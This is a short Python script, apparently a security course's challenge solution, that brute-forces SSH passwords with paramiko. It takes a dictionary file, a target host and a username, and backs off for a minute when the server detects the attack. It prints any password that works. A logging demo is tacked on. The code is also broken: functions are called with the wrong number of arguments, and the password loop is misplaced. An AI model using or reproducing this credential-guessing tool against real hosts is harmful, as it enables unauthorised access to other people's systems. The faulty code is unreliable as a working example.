#!/usr/bin/python3

# Script: Ops 401d5 Ops Challenge Solution 26
# Author: Jon Salhus                  
# Date of latest revision: 11/7/2022
# Purpose: 

import logging
import paramiko
import socket
import time
from colorama import init, Fore

init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE

plist = input("Enter the filename of your dictionary.\n")
f = open(plist, 'r')

hostname = input("Enter the IP address or host name.\n")
username = input("Enter the user name.\n")
password = input("Enter a password.\n")
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def brute(password):
    try:
        ssh.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
    except paramiko.SSHException:
        print(f"{BLUE}[*] Attack detected, sleeping...{RESET}")
        time.sleep(60)
        return brute(hostname, username, password)
    else:
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        exit(0)
    for password in f:
        brute(password.rstrip())

# MAIN FOR LOGS
logging.basicConfig(filename='./testlog.log', level=logging.ERROR, format='%(asctime)s:%(levelname)s:%(message)s')
print('Logging initialized.')
logging.debug('Get rid of the bugs!')
logging.info('Informative')
logging.warning('Uh oh! You should look into this!')
logging.error('An error has occurred.')
logging.critical('Critical! You REALLY need to look into this!')

try:
    brute()
except Exception as msg:
    print(msg)
    logging.exception(msg)

print('Logging complete.')